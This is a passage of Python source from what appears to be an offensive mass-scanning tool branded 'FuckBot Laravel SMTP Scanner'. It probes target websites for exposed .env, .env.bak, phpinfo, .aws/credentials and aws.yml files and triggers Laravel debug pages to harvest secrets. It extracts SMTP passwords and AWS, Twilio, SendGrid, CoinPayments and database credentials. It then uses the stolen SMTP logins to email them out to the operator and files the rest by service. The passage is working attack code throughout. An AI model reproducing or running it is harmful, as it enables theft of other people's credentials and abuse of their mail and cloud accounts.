            #db_config_live = self.set_result(filename="laravel_database_live.txt")
            #db_config_dead = self.set_result(filename="laravel_database_dead.txt")
            
            smtp_live = self.set_result(filename="smtp_live.txt")
            smtp_dead = self.set_result(filename="smtp_dead.txt")
            
            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://".format(url)
            
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            try:
                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                if "APP_KEY" in get_config.text:
                    config_value = get_config.text
                    
                    #"MAIL_HOST",
                    #"MAIL_PORT",
                    #"MAIL_ENCRYPTION",
                    #"MAIL_USERNAME",
                    #"MAIL_PASSWORD",
                    #"MAIL_FROM_ADDRESS",
                    #"MAIL_FROM_NAME",
                    
                    try:
                        mail_host = re.findall("MAIL_HOST=(.*)", config_value)[0]
                    except:
                        mail_host = "-"
                        
                    try:
                        mail_port = re.findall("MAIL_PORT=(.*)", config_value)[0]
                    except:
                        mail_port = "-"
                    
                    try:
                        mail_user = re.findall("MAIL_USERNAME=(.*)", config_value)[0]
                    except:
                        mail_user = "-"
                        
                    try:
                        mail_pass = re.findall("MAIL_PASSWORD=(.*)", config_value)[0]
                    except:
                        mail_pass = "-"
                    
                    try:
                        mail_from = re.findall("MAIL_FROM_ADDRESS=(.*)", config_value)[0]
                    except:
                        mail_from = "-"
                    
                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )

                    if "<td>APP_KEY</td>" in get_config.text:
                        config_value = get_config.text
                        
                        try:
                            mail_host = re.findall("<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_host = "-"
                            
                        try:
                            mail_port = re.findall("<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_port = "-" 
                            
                        try:
                            mail_user = re.findall("<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_user = "-"
                            
                        try:
                            mail_pass = re.findall("<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_pass = "-"
                        
                        try:
                            mail_from = re.findall("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_from = "-"
                    else:
                        config_value = False
                        
                if config_value:
                    
                    if "mailtrap.io" not in mail_host and "-" not in mail_host:
                        
                        #CLEAN_ADDR = mail_from if "-" not in mail_from elif "@"  else "j3mbotmaw0ttz@idx.id"
                        CLEAN_ADDR = mail_from if "-" not in mail_from else mail_user if "@" in mail_user else "j3mbotmaw0ttz@idx.go.id"
                        #print(from_addr)
                        #if mail_from == "-": 
                        #    mail_from = mail_user
                            
                        mime = MIMEMultipart('alternative')
                        mime['Subject'] = "FuckBot SMTP Checker (%s)" % CLEAN_ADDR
                        mime['From']    = email.utils.formataddr(("J3mBotMaw0ttz", CLEAN_ADDR))
                        mime['To']      = self.SMTP_TEST
                        
                        BODY_TEXT = "====================[ $$ FuckBot Laravel SMTP Scanner $$ ]====================\n"
                        BODY_TEXT += "# Host       : %s\n" % mail_host
                        BODY_TEXT += "# Port       : %s\n" % mail_port
                        BODY_TEXT += "# Username   : %s\n" % mail_user
                        BODY_TEXT += "# Password   : %s\n" % mail_pass
                        BODY_TEXT += "# From Email : %s\n" % CLEAN_ADDR
                        BODY_TEXT += "=========================================================================" + "\n"
                        
                        _body_text_ = self.join_string(BODY_TEXT)
                        
                        BODY_HTML = "<html>\n"
                        BODY_HTML += "<head>\n"
                        BODY_HTML += "<body>\n"
                        BODY_HTML += "<pre>\n"
                        BODY_HTML += BODY_TEXT
                        BODY_HTML += "</pre>\n"
                        BODY_HTML += "</body>\n"
                        BODY_HTML += "</html>\n"
                        
                        _body_html_ = self.join_string(BODY_HTML)
                         
                        plain = MIMEText(_body_text_, 'plain')
                        html = MIMEText(_body_html_, 'html')
                         
                        mime.attach(plain)
                        mime.attach(html)
                         
                        try:
                            server = smtplib.SMTP(mail_host, mail_port)
                            server.ehlo()
                            server.starttls()
                            server.ehlo()
                            server.login(mail_user, mail_pass)
                            server.sendmail(CLEAN_ADDR, self.SMTP_TEST, mime.as_string())
                            server.close()
                            
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["|".join([mail_host, mail_port, mail_user, mail_pass]), "Success"],
                                status=True,
                                mode="Laravel SMTP Scanner",
                            )
                            self.write_file(smtp_live, _body_text_)
                        except:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["|".join([mail_host, mail_port, mail_user, mail_pass]), "Failed"],
                                status=False,
                                mode="Laravel SMTP Scanner",
                            )
                            self.write_file(smtp_dead, _body_text_)
                else:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Config Not Found",
                        status=False,
                        mode="Laravel SMTP Scanner",
                    )
                
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel SMTP Scanner"
                )
                
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            
    
    
    # Credential Grab 
    
    def credential_checker(self, counter, length, url):
        
        try:
            
            result_aws          = self.set_result("RESULT-AWS.txt")
            result_twilio       = self.set_result("RESULT-TWILIO.txt")
            result_plivo        = self.set_result("RESULT-PLIVO.txt")
            result_nexmo        = self.set_result("RESULT-NEXMO.txt")
            result_coinpayments = self.set_result("RESULT-COINPAYMENTS.txt")
            result_sendgrid     = self.set_result("RESULT-SENDGRID.txt")
            result_mailgun      = self.set_result("RESULT-MAILGUN.txt")
            result_office       = self.set_result("RESULT-OFFICE365.txt")
            result_ionos        = self.set_result("RESULT-IONOS.txt")
            result_mandrillapp  = self.set_result("RESULT-MANDRILLAPP.txt")
            result_database     = self.set_result("RESULT-DATABASE.txt")
            result_variable     = self.set_result("RESULT-VARIABLE.txt")
            result_mail_other   = self.set_result("RESULT-MAIL-OTHER.txt")
            
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            headers = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            }
            
            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)
                
            try:
                
                url_config = "/".join([target_url, "_profiler/phpinfo"])
                get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                
                if "PHP Variables" in get_config.text and "Environment" in get_config.text:
                    
                    if "AKIA" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found AWS",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_aws, url_config)
                    elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found TWILIO",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_twilio, url_config)
                    elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found PLIVO",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_plivo, url_config)
                    elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Nexmo",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_nexmo, url_config)
                    elif "COINPAYMENTS" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found CoinPayments",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_coinpayments, url_config)
                    elif "SG." in get_config.text or "sendgrid" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Sendgrid",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_sendgrid, url_config)
                    elif "mailgun" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Mailgun",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_mailgun, url_config)
                    elif "office365" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Office365",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_office, url_config)
                    elif "ionos" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Ionos",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_ionos, url_config)
                    elif "MAIL_PASSWORD" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Mail Other",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_mail_other, url_config)
                    elif "mandrillapp" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Mandrillapp",
                            status=True,
                            mode="Hidden Config Scanner",
                        )
                        self.write_file(result_mandrillapp, url_config)
                    
                    else:
                        if "DB_USERNAME" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Database",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_database, url_config)
                            self.write_file(result_variable, url_config)
                        
                    
                else:
                    
                    url_config = "/".join([target_url, "phpinfo.php"])
                    get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                    
                    if "PHP Variables" in get_config.text and "Environment" in get_config.text:
                        if "AKIA" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found AWS",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_aws, url_config)
                        elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                            self.show_status_message(
                                time=time_now,counter=counter,
                                length=length,
                                data=url_config,
                                message="Found TWILIO",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_twilio, url_config)
                        elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found PLIVO",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_plivo, url_config)
                        elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Nexmo",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_nexmo, url_config)
                        elif "COINPAYMENTS" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found CoinPayments",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_coinpayments, url_config)
                        elif "SG." in get_config.text or "sendgrid" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Sendgrid",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_sendgrid, url_config)
                        elif "mailgun" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Mailgun",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_mailgun, url_config)
                        elif "office365" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Office365",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_office, url_config)
                        elif "ionos" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Ionos",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_ionos, url_config)
                        elif "MAIL_PASSWORD" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Mail Other",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_mail_other, url_config)
                        elif "mandrillapp" in get_config.text:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Mandrillapp",
                                status=True,
                                mode="Hidden Config Scanner",
                            )
                            self.write_file(result_mandrillapp, url_config)
                    
                        else:
                            if "DB_USERNAME" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Database",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_database, url_config)
                                self.write_file(result_variable, url_config)
                    
                    else:
                        
                        url_config = "/".join([target_url, "phpinfo"])
                        get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                        
                        if "PHP Variables" in get_config.text and "Environment" in get_config.text:
                            if "AKIA" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found AWS",
                                    status=True,
                                    mode="Hidden Config Scanner"
                                )
                                self.write_file(result_aws, url_config)
                            elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                self.show_status_message(
                                    time=time_now,counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Twilio",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_twilio, url_config)
                            elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Plivo",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_plivo, url_config)
                            elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Nexmo",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_nexmo, url_config)
                            elif "COINPAYMENTS" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Coinpayments",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_coinpayments, url_config)
                            elif "SG." in get_config.text or "sendgrid" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Sendgrid",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_sendgrid, url_config)
                            elif "mailgun" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Mailgun",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_mailgun, url_config)
                            elif "office365" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Office365",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_office, url_config)
                            elif "ionos" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Ionos",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_ionos, url_config)
                            elif "MAIL_PASSWORD" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Mail Other",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_mail_other, url_config)
                            elif "mandrillapp" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Mandrillapp",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_mandrillapp, url_config)
                    
                            else:
                                
                                if "DB_USERNAME" in get_config.text:
                                    self.show_status_message(
                                        time=time_now,
                                        counter=counter,
                                        length=length,
                                        data=url_config,
                                        message="Found Database",
                                        status=True,
                                        mode="Hidden Config Scanner",
                                    )
                                    self.write_file(result_database, url_config)
                                    self.write_file(result_variable, url_config)
                                
                        
                        else:
                            
                            url_config = "/".join([target_url, "aws.yml"])
                            get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                            
                            if "[default]" in get_config.text and "AKIA" in get_config.text:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found AWS",
                                    status=True,
                                    mode="Hidden Config Scanner",
                                )
                                self.write_file(result_aws, url_config)
                                
                            else:
                                
                                url_config = "/".join([target_url, ".env.bak"])
                                get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                            
                                if "APP_KEY" in get_config.text:
                                    
                                    if "AKIA" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found AWS",
                                            status=True,
                                            mode="Hidden Config Scanner"
                                        )
                                        self.write_file(result_aws, url_config)
                                    elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Twilio",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_twilio, url_config)
                                    elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Plivo",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_plivo, url_config)
                                    elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Nexmo",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_nexmo, url_config)
                                    elif "COINPAYMENTS" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Coinpayments",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_coinpayments, url_config)
                                    elif "SG." in get_config.text or "sendgrid" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Sendgrid",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_sendgrid, url_config)
                                    elif "mailgun" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Mailgun",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_mailgun, url_config)
                                    elif "office365" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Office365",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_office, url_config)
                                    elif "ionos" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Ionos",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_ionos, url_config)
                                    elif "MAIL_PASSWORD" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Mail Other",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_mail_other, url_config)
                                    elif "mandrillapp" in get_config.text:
                                        self.show_status_message(
                                            time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Mandrillapp",
                                            status=True,
                                            mode="Hidden Config Scanner",
                                        )
                                        self.write_file(result_mandrillapp, url_config)
                    
                                    else:
                                
                                        if "DB_USERNAME" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Database",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_database, url_config)
                                            self.write_file(result_variable, url_config)
                                    
                                else:
                                    
                                    url_config = "/".join([target_url, "info.php"])
                                    get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                                
                                    if "PHP Variables" in get_config.text and "Environment" in get_config.text:
                                        
                                        if "AKIA" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found AWS",
                                                status=True,
                                                mode="Hidden Config Scanner"
                                            )
                                            self.write_file(result_aws, url_config)
                                        elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Twilio",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_twilio, url_config)
                                        elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Plivo",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_plivo, url_config)
                                        elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Nexmo",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_nexmo, url_config)
                                        elif "COINPAYMENTS" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Coinpayments",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_coinpayments, url_config)
                                        elif "SG." in get_config.text or "sendgrid" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Sendgrid",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_sendgrid, url_config)
                                        elif "mailgun" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Mailgun",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_mailgun, url_config)
                                        elif "office365" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Office365",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_office, url_config)
                                        elif "ionos" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Ionos",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_ionos, url_config)
                                        elif "MAIL_PASSWORD" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Mail Other",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_mail_other, url_config)
                                        elif "mandrillapp" in get_config.text:
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Mandrillapp",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_mandrillapp, url_config)
                    
                                        else:
                                
                                            if "DB_USERNAME" in get_config.text:
                                                self.show_status_message(
                                                    time=time_now,
                                                    counter=counter,
                                                    length=length,
                                                    data=url_config,
                                                    message="Found Database",
                                                    status=True,
                                                    mode="Hidden Config Scanner",
                                                )
                                                self.write_file(result_database, url_config)
                                                self.write_file(result_variable, url_config)
                                    
                                    else:
                                        
                                        # Missconfigure Admin
                                    
                                        url_config = "/".join([target_url, ".aws/credentials"])
                                        get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                                    
                                        if "[default]" in get_config.text and "AKI" in get_config.text:
                                            
                                            self.show_status_message(
                                                time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found AWS",
                                                status=True,
                                                mode="Hidden Config Scanner",
                                            )
                                            self.write_file(result_aws, url_config)
                                            
                                        else:
                                        
                                            # Missconfigure AWS
                                        
                                            url_config = "/".join([target_url, "config/aws.yml"])
                                            get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                                        
                                            if "AKI" in get_config.text and "access_key_id" in get_config.text:
                                                
                                                self.show_status_message(
                                                    time=time_now,
                                                    counter=counter,
                                                    length=length,
                                                    data=url_config,
                                                    message="Found AWS",
                                                    status=True,
                                                    mode="Hidden Config Scanner",
                                                )
                                                self.write_file(result_aws, url_config)
                                                
                                            else:
                                            
                                               # Debug Laravel
                                            
                                                url_config = target_url
                                                get_config = requests.get(url=url_config, headers=headers, data={"0x[]": "0x_0x"}, allow_redirects=True, timeout=15)
                                            
                                                if "APP_KEY" in get_config.text:
                                                    
                                                    if "AKIA" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found AWS",
                                                            status=True,
                                                            mode="Hidden Config Scanner"
                                                        )
                                                        self.write_file(result_aws, url_config)
                                                    elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Twilio",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_twilio, url_config)
                                                    elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Plivo",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_plivo, url_config)
                                                    elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Nexmo",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_nexmo, url_config)
                                                    elif "COINPAYMENTS" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Coinpayments",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_coinpayments, url_config)
                                                    elif "SG." in get_config.text or "sendgrid" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Sendgrid",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_sendgrid, url_config)
                                                    elif "mailgun" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Mailgun",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_mailgun, url_config)
                                                    elif "office365" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Office365",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_office, url_config)
                                                    elif "ionos" in get_config.text:
